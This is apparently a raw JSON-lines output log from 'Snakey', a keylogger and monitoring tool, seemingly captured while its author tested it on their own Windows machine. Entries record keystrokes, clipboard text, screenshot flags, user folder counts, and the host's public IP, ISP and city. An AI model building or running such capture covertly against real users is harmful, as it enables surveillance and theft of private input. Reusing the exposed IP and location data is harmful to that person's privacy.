{"timestamp": "2025-06-20T23:27:11.423189+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Performance Testing\nOn an average user system (Intel i5, 8GB RAM), Snakey operated with under\n2% CPU usage and negligible memory consumption. It was verified that the\nlogger does not affect system responsiveness", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "45e48a9e38e9287b075a023bbf3d395ddcf12d172b88d71909394a581c05ea24", "screenshot_hash": "848a97975e9b4a47708662248d9f3e6e87b3e346b69ee7769c7f046fec54aa53", "_raw_log_hash": "8661af2ab59f262dce5721845f1f98e7bd576004188ac90a2ada32e906e5bac0"}
{"timestamp": "2025-06-20T23:27:26.172329+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Performance Testing\nOn an average user system (Intel i5, 8GB RAM), Snakey operated with under\n2% CPU usage and negligible memory consumption. It was verified that the\nlogger does not affect system responsiveness", "keystrokes": "[ctrl_l]\u0013[ctrl_l]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "45e48a9e38e9287b075a023bbf3d395ddcf12d172b88d71909394a581c05ea24", "screenshot_hash": "b7abb24bccbc30ae4c8eea46f22a25a94f848748081fed5cd50efa3947395e60", "_raw_log_hash": "f199fbbe4d96a1425c9a8f31869f468c93ebbe2e4c5ae296f00fc722d6fe99e3"}
{"timestamp": "2025-06-20T23:28:59.335481+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Performance Testing\nOn an average user system (Intel i5, 8GB RAM), Snakey operated with under\n2% CPU usage and negligible memory consumption. It was verified that the\nlogger does not affect system responsiveness", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "45e48a9e38e9287b075a023bbf3d395ddcf12d172b88d71909394a581c05ea24", "screenshot_hash": "dec47e29dcf9adced403095afb4653421f76c6e6552d3721d77d97c3115fd678", "_raw_log_hash": "c972c06aae8180dcc1bc11e455ac58e06f63098a1eaf14c475487ab6c401483c"}
{"timestamp": "2025-06-20T23:29:24.765468+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Performance Testing\nOn an average user system (Intel i5, 8GB RAM), Snakey operated with under\n2% CPU usage and negligible memory consumption. It was verified that the\nlogger does not affect system responsiveness", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "45e48a9e38e9287b075a023bbf3d395ddcf12d172b88d71909394a581c05ea24", "screenshot_hash": "19f1b97f418c4f130a3caff5dc29f9618b64eff9ad38169193293ba9719b305c", "_raw_log_hash": "51a1cdb158fafc4b139c92228d8057b12bad2afc182b7de711e2772fda7e3941"}
{"timestamp": "2025-06-20T23:29:41.125044+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Performance Testing\nOn an average user system (Intel i5, 8GB RAM), Snakey operated with under\n2% CPU usage and negligible memory consumption. It was verified that the\nlogger does not affect system responsiveness", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "45e48a9e38e9287b075a023bbf3d395ddcf12d172b88d71909394a581c05ea24", "screenshot_hash": "83dafee49a50dd6db8375b73642d171716f7f6a2bee34dc0fe0f26d567585e79", "_raw_log_hash": "8154d3f6f66c7404f0a52dfbeb2dd95c82cb398815f659fcdc61f81672373294"}
{"timestamp": "2025-06-20T23:29:57.610929+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Performance Testing\nOn an average user system (Intel i5, 8GB RAM), Snakey operated with under\n2% CPU usage and negligible memory consumption. It was verified that the\nlogger does not affect system responsiveness", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "45e48a9e38e9287b075a023bbf3d395ddcf12d172b88d71909394a581c05ea24", "screenshot_hash": "3f2f8268fa6dd70e370fd4b93f238d0ece1b9676e8d4f040073990e157bbd00b", "_raw_log_hash": "22f0dd36077a1507c7cd79ed8f692641f3283244544f8d591cf56a83bd7dbc5c"}
{"timestamp": "2025-06-20T23:30:12.876822+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Performance Testing\nOn an average user system (Intel i5, 8GB RAM), Snakey operated with under\n2% CPU usage and negligible memory consumption. It was verified that the\nlogger does not affect system responsiveness", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "45e48a9e38e9287b075a023bbf3d395ddcf12d172b88d71909394a581c05ea24", "screenshot_hash": "d2e3a84b2009e9e3605412b22c63abf3e60367cdd92ae5c0e93b63090d90cfd4", "_raw_log_hash": "b3f278b58ab76289e2ef12e653b5c0f75f87bc89e964404b412e6a802e14d5f4"}
{"timestamp": "2025-06-20T23:30:27.469922+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Performance Testing\nOn an average user system (Intel i5, 8GB RAM), Snakey operated with under\n2% CPU usage and negligible memory consumption. It was verified that the\nlogger does not affect system responsiveness", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "45e48a9e38e9287b075a023bbf3d395ddcf12d172b88d71909394a581c05ea24", "screenshot_hash": "750b5273a4693ae1b4888b20cc3591f003498ed0c8635d5b1e1901924d108599", "_raw_log_hash": "2b66135a3e28aa748e294b0b25c94e413466ff0511f25d64619f741b3a7cd537"}
{"timestamp": "2025-06-20T23:30:41.940578+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Performance Testing\nOn an average user system (Intel i5, 8GB RAM), Snakey operated with under\n2% CPU usage and negligible memory consumption. It was verified that the\nlogger does not affect system responsiveness", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "45e48a9e38e9287b075a023bbf3d395ddcf12d172b88d71909394a581c05ea24", "screenshot_hash": "659616a9a4a7844ea55f3affbec8a8b3fe7b6829e49895f4e6ccd2e2c78cbde9", "_raw_log_hash": "074add9578cc74b7b09c47e6e421d0261c6da2e15439d73164bcf51ad3c2e051"}
{"timestamp": "2025-06-20T23:30:56.723942+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Performance Testing\nOn an average user system (Intel i5, 8GB RAM), Snakey operated with under\n2% CPU usage and negligible memory consumption. It was verified that the\nlogger does not affect system responsiveness", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "45e48a9e38e9287b075a023bbf3d395ddcf12d172b88d71909394a581c05ea24", "screenshot_hash": "ec7dadea300e5376da718dfc057963fd87e4fc26f69df2cf431b896daec1b71b", "_raw_log_hash": "673870c7e6fc0999cad367eed147cbab29d0e19a4902bcc72aef26ec577c5c7e"}
{"timestamp": "2025-06-20T23:31:11.038425+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Performance Testing\nOn an average user system (Intel i5, 8GB RAM), Snakey operated with under\n2% CPU usage and negligible memory consumption. It was verified that the\nlogger does not affect system responsiveness", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "45e48a9e38e9287b075a023bbf3d395ddcf12d172b88d71909394a581c05ea24", "screenshot_hash": "d7a37ad305af6978d225edef0bdb2dd45b8bae3d9f929ccc2ba5815a85b69d92", "_raw_log_hash": "e823459953ff79d43a9c9414882a632108cfd57eac2fb40cb0192eed7985f008"}
{"timestamp": "2025-06-20T23:31:25.725149+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Performance Testing\nOn an average user system (Intel i5, 8GB RAM), Snakey operated with under\n2% CPU usage and negligible memory consumption. It was verified that the\nlogger does not affect system responsiveness", "keystrokes": "[ctrl_l]\u0013", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "45e48a9e38e9287b075a023bbf3d395ddcf12d172b88d71909394a581c05ea24", "screenshot_hash": "a0f764dd9f62aa6a35b6ecc8ef3b5a5800f18fcedee9c117cbc186e887b3b911", "_raw_log_hash": "deb5e1b6cad1b8f835b3221b6e92c5251974c221280fd62457f35cdb0bb5d9b7"}
{"timestamp": "2025-06-20T23:31:40.477624+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Performance Testing\nOn an average user system (Intel i5, 8GB RAM), Snakey operated with under\n2% CPU usage and negligible memory consumption. It was verified that the\nlogger does not affect system responsiveness", "keystrokes": "[BACKSPACE]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "45e48a9e38e9287b075a023bbf3d395ddcf12d172b88d71909394a581c05ea24", "screenshot_hash": "f7a2ad80a8bd217026dcc0340504c7478ed4ae9119f1f50b1d0647f3dd05d2d7", "_raw_log_hash": "4739e12c6e2f5122bb3ceb106759831c0341fd9569ac2f1a5a3fe2de86a34180"}
{"timestamp": "2025-06-20T23:31:55.207867+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Performance Testing\nOn an average user system (Intel i5, 8GB RAM), Snakey operated with under\n2% CPU usage and negligible memory consumption. It was verified that the\nlogger does not affect system responsiveness", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "45e48a9e38e9287b075a023bbf3d395ddcf12d172b88d71909394a581c05ea24", "screenshot_hash": "820e691d8d9b1dcf0c645ed4de062661ec9984937871cf7a4edd583f69013064", "_raw_log_hash": "1380df693b70f446c902395ee983e61035c80339235ed1e72126994f279fddef"}
{"timestamp": "2025-06-20T23:32:09.662058+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Performance Testing\nOn an average user system (Intel i5, 8GB RAM), Snakey operated with under\n2% CPU usage and negligible memory consumption. It was verified that the\nlogger does not affect system responsiveness", "keystrokes": "[BACKSPACE][ctrl_l]\u0013", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "45e48a9e38e9287b075a023bbf3d395ddcf12d172b88d71909394a581c05ea24", "screenshot_hash": "8aff7d9e1cb5cc686c61585a95434043be6eda111aeca437a5e43d001f0295ae", "_raw_log_hash": "7f67dd573fa34b1395eb147fd894166ba38318bc8e060936188fba0db13346e1"}
{"timestamp": "2025-06-20T23:47:16.564913+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Your ledger says the encrypted file\u2019s hash is:\n9357ae72bf24d89e650485c82308c2490f7d607fb0937960fc556ffced60cf6c\n\nYou computed the hash of your file and got:\n2f8c1748b003615c9ecab003cfaefc24f48f099c392727b25981d4b3475b48f3\n\nBecause these two don\u2019t match, it means:", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "232db67d32c12bd7a896e54abdb2c7caae10d56ace8426c9ac31002d8ad602bf", "screenshot_hash": "6c95e00096a649033b82ae43c9b1a58684e6e717453fbe76e8c8dbbbcb9f9c9c", "_raw_log_hash": "a7d68bef17a5d72f2e2fa951772182ca68e63167e88d44b79be735e53c155172"}
{"timestamp": "2025-06-20T23:47:32.040272+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Your ledger says the encrypted file\u2019s hash is:\n9357ae72bf24d89e650485c82308c2490f7d607fb0937960fc556ffced60cf6c\n\nYou computed the hash of your file and got:\n2f8c1748b003615c9ecab003cfaefc24f48f099c392727b25981d4b3475b48f3\n\nBecause these two don\u2019t match, it means:", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "232db67d32c12bd7a896e54abdb2c7caae10d56ace8426c9ac31002d8ad602bf", "screenshot_hash": "2e8c26435b9bcd6f6dff0c47508a56b59cc493891b9da89da713c0ebf508aab7", "_raw_log_hash": "ef60063dbd2b6dcbcd9d6bf5661ba81d509cab7e2f36373aba67b3e1b6b7a31d"}
{"timestamp": "2025-06-20T23:47:46.501660+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Your ledger says the encrypted file\u2019s hash is:\n9357ae72bf24d89e650485c82308c2490f7d607fb0937960fc556ffced60cf6c\n\nYou computed the hash of your file and got:\n2f8c1748b003615c9ecab003cfaefc24f48f099c392727b25981d4b3475b48f3\n\nBecause these two don\u2019t match, it means:", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "232db67d32c12bd7a896e54abdb2c7caae10d56ace8426c9ac31002d8ad602bf", "screenshot_hash": "079cba8cfa1cc75a17ff7eefb21ff08538ff0c76493056f766d2e7bcbf160757", "_raw_log_hash": "55e0584ee2da4459ecf01ab87ef0e4202e7fecaf0ad1b29145ca3237f3a85e4d"}
{"timestamp": "2025-06-21T10:34:07.555903+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "59636c7edd83e3a71a0dda26e75b180d0e98194aff692c6a10a73b3ba0baec16", "_raw_log_hash": "054800e66909c5db53042f34414e7ea467bd8993959c688204c84f61f9f154a7"}
{"timestamp": "2025-06-21T10:34:22.554317+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2d67db5a5268c25774b3d62ffbabb06d62bf4cbec5abcb3153fafed2286b5464", "_raw_log_hash": "2ec108422508eee9437d788ab8a7716f947f6beb29ffcb169ae129e4e3063962"}
{"timestamp": "2025-06-21T10:34:36.802995+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d75d9e904230be8a35a6f1061037f193c2df5ccbf16401b22fe27e250aebd566", "_raw_log_hash": "57d04d5f9b3441460ae6e361125657418ec2d216f69f64412728d7aac2ff5d07"}
{"timestamp": "2025-06-21T10:34:51.070385+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "652d3bf5df9f9cee1d0f0243b7f6482b1d213926e25a42253daecf3a9823f46d", "_raw_log_hash": "7594329f70d7ca206f9da7ea4639bf6c192999ab53a8c3bfe5d2fd85eb986ec1"}
{"timestamp": "2025-06-21T10:35:05.193881+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "aa89e846a77f7b1a41ee45a52412651802e90131e497a32024f5820bba7c39f9", "_raw_log_hash": "dad7996bee6570422c58cd899e7b73b03bd6fa026ceadfe5116bb879870cf92d"}
{"timestamp": "2025-06-21T10:35:19.730845+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "0c1c95fea4f7203e81f57dcbae9f0c465b70e69a422496db04209225a9ffc9b8", "_raw_log_hash": "369445609674388b7934997bd5478d19d245633d3c598d43fcf8416ca7b3cc7e"}
{"timestamp": "2025-06-21T10:35:33.926592+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "1e12041484d03a99b34e760d6b4867cb03d32b1534acb3dcb4cae06b442e5246", "_raw_log_hash": "0e91a9676bc942f10842b512a3c8069b148a270ec784128aeb3150ff59ad638f"}
